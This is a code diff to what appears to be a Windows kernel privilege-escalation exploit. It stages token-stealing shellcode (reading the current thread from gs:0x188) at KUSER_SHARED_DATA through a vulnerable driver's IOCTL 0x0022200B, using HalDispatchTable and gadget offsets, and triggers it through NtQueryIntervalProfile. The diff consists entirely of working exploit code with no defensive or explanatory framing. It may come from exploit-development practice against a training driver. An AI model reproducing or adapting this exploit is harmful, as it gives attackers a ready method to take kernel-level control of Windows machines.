@@ -16,9 +16,8 @@
 #define HALDISPATCHTABLE 0x339230
 #define JMPRSI_OPCODE 0x66953e
 
-unsigned long long payload[10];
+unsigned long long payload[10] = {};
 
-payload[0] = 0x00018825048B4865;
 /*
 const unsigned char payload[] = {
     "\x65\x48\x8B\x04\x25\x88\x01\x00\x00"              // mov rax,[gs:0x188]  ; Current thread (KTHREAD)
@@ -298,7 +297,8 @@ bool ExecuteShellcodeByNtQueryIntervalProfile()
 
 void *GenerateShellCode(HANDLE driverHandle)
 {
+    payload[0] = 0x00018825048B4865;
 
-    SendToDriver(driverHandle,0x0022200B,(void*) payload[0], halDispatchTable+0);
+    SendToDriver(driverHandle,0x0022200B,(void*) payload[0], ((unsigned long long) KUSER_SHARED_DATA)+1);
     return (void*) KUSER_SHARED_DATA;
 }
